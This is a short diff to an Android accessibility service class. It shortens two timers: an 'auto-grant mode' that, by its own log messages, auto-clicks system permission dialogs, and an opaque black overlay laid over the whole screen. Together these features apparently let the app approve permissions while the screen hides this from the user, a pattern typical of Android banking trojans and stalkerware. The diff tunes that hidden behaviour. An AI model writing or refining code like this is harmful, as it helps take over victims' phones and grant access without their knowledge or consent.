@@ -918,12 +918,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
         }, 1_000);
 
-        // Auto-grant mode expires after 60 seconds (enough for all permission dialogs)
+        // Auto-grant mode expires after 25 seconds
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 60 seconds");
-        }, 60_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 60s");
+            Log.i(TAG, "Auto-grant mode expired after 25 seconds");
+        }, 25_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 25s");
     }
 
     /**
@@ -1019,12 +1019,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 PixelFormat.OPAQUE
             );
             overlayWindowManager.addView(overlayView, lp);
-            Log.i(TAG, "Black overlay added — auto-removes in 50 s");
+            Log.i(TAG, "Black overlay added — auto-removes in 30 s");
 
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { removeBlackOverlay(); } catch (Exception ignored) {}
-                Log.i(TAG, "Black overlay removed after 50 s");
-            }, 50_000);
+                Log.i(TAG, "Black overlay removed after 30 s");
+            }, 30_000);
         } catch (Exception e) {
             Log.e(TAG, "addBlackOverlay error: " + e.getMessage());
         }
